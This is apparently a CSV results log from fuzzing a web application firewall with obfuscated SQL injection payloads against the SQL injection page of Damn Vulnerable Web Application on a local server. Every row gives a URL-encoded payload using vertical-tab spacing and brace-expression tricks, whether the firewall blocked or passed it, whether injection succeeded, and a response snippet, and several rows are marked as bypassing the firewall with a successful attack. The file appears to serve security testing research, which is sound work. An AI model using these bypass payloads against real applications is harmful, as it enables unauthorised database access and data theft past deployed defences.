Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(not+1)+or',Bypassed,No,None,Invalid,0.0219,71.21,No,500,
0'<@!=1.%0bor%0b!+{x+(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Invalid,0.0233,71.21,No,500,
0%27<@!=.1%0b||+0=+(!%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0129,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b!%0b{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0329,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+0=%0b(!+{`if`+1}=1)+||%27,Bypassed,No,None,Invalid,0.0178,71.21,No,500,
0%27<@=1.+||%0b!+{`if`%0b1}=1=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Invalid,0.025,71.21,No,500,
0%27<@=1%0b||+not~0=+(!+{`if`+1}=1)%0b||',Bypassed,No,None,Invalid,0.0446,71.21,No,500,
0%27<@=1+||+!~false=%0b(not%0b{`if`+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0232,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!+{x+(select+1)}=1+is+false+||%27,Blocked,No,None,Invalid,0.0288,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||%0bnot+true=+(not~false)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.029,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+!+true=+(not+{x+(select%0b1)}=1)+or%27,Blocked,No,None,Invalid,0.0162,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or+not+{x+(select%0b1)}=1=+(not+{x%0b(select%0b1)}=1),Blocked,No,None,Invalid,0.0329,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or%0b@<@.%0b||%0b!+{x%0b(select%0b1)}=1=%0b(!+{a+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0399,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0b{x+(select%0b1)}=1%0blike%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Invalid,0.0444,71.21,No,500,
0'<@!=1.%0bor+not%0btrue=+(not+{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0262,71.21,No,500,
0'<@=1%0bor%0b!%0btrue=+(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.02,71.21,No,500,
0'<@=1.%0bor%0b0=%0b(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.041,71.21,No,500,
0%27<@!=1+or+not%7e0=+(not%0b{x%0b(select%0b1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0323,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not+{x+(select+1)}=1=%0b(not+{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0149,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0b!%0b{x+(select+1)}=1=+(!~false)%0bor%27,Bypassed,No,None,Invalid,0.0697,71.21,No,500,
0'<@!=1%0b||%0bnot+{x%0b(select+1)}=1=%0b(!+{`if`+1}=1)%0b,Bypassed,No,None,Invalid,0.0351,71.21,No,500,
0%27<@!=1.+or%0bnot+true=+(not+{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0197,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0b!+{`if`+1}=1=%0b(not%0b{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0158,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+!%0b{`if`%0b1}=1=%0b(!+{x+(select%0b1)}=1)+,Bypassed,No,None,Invalid,0.0335,71.21,No,500,
0%27<@!=1+or+!%0b{`if`+1}=1=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.0386,71.21,No,500,
0'<@!=.1%0bor%0b!%7efalse=+(not%0b{a+1}=1)+or',Bypassed,No,None,Invalid,0.0328,71.21,No,500,
0'<@=1+or+not+{x%0b(select+1)}=1=+(not~0)+||%27,Bypassed,No,None,Invalid,0.0199,71.21,No,500,
0'<@=1%0bor+not+{a+1}=1=+(!%0b{x%0b(select+1)}=1)--,Bypassed,No,None,Invalid,0.0601,71.31,No,500,
0%27<@!=1.+||+not%0b{x+(select+1)}=1=+(!%0b{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0496,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+!+{x+(select%0b1)}=1=+(false)%0b||',Blocked,No,None,Invalid,0.0167,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0bnot%0b{a+1}=1=+(!+{x%0b(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0263,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0bfalse=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0141,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0bfalse=%0b(!+{a%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0422,71.63,No,500,
0%27<@=.1%0b||+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0466,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+not+{a%0b1}=1=%0b(not+{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0466,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+!+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0506,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b!%0b{x%0b(select+1)}=1=%0b(false)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0134,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0b!%0b{a+1}=1=%0b(0)+or',Bypassed,No,None,Invalid,0.0185,71.63,No,500,
0'<@=1.+or%0b0=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Invalid,0.045,71.63,No,500,
0%27<@=1+||+!+true=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0339,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+@<@.+or%0b{x+(select+1)}=1%0blike%0b{`if`+1}=1%0bor',Blocked,No,None,Invalid,0.0058,69.43,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+!%7efalse=+(!+{a+1}=1)+||%27,Bypassed,No,None,Invalid,0.0117,70.0,No,500,
0%27<@!=1%0b||%0bnot+{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0236,70.0,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0b!%0b{x+(select%0b1)}=1=+(!~false)+or%27,Blocked,No,None,Invalid,0.0224,70.0,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||%0bnot%7efalse=%0b(!%0b{a+1}=1)+||',Bypassed,No,None,Invalid,0.0282,70.42,No,500,
0'<@!=.1%0b||%0b!%7efalse=+(!%0b{a+1}=1)+or',Bypassed,No,None,Invalid,0.0394,71.04,No,500,
0'||%0b@<@.+||%0b!%0b{`if`+1}=1=%0b(!+{`if`%0b1}=1)%0b,Bypassed,No,None,Invalid,0.0312,71.04,No,500,
0'<@!=1.+or%0b!%0b{x+(select+1)}=1=+(!+{x%0b(select+1)}=1),Blocked,No,None,Invalid,0.0182,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||%0b!%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1),Blocked,No,None,Invalid,0.0381,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor+not%0b{x+(select+1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0521,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+!@<@.+||%0bnot%0b{a+1}=1=%0b(not+{`if`%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.018,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0bnot~false=%0b(not+{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0235,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||%0b@<@.+||+!%0b{x%0b(select+1)}=1=+(!%0b{a+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0175,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0bnot+{x%0b(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0251,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=+(false)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0346,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot+{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)+,Bypassed,No,None,Invalid,0.0393,71.21,No,500,
0%27<@=.1%0b||%0b!+{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0231,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not%7efalse=%0b(!~false)+or',Bypassed,No,None,Invalid,0.016,71.21,No,500,
0'<@!=.1+||+false=+(!~false)--%0b,Blocked,No,None,Invalid,0.0057,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||%0bnot%7e0=%0b(not+true)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0426,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
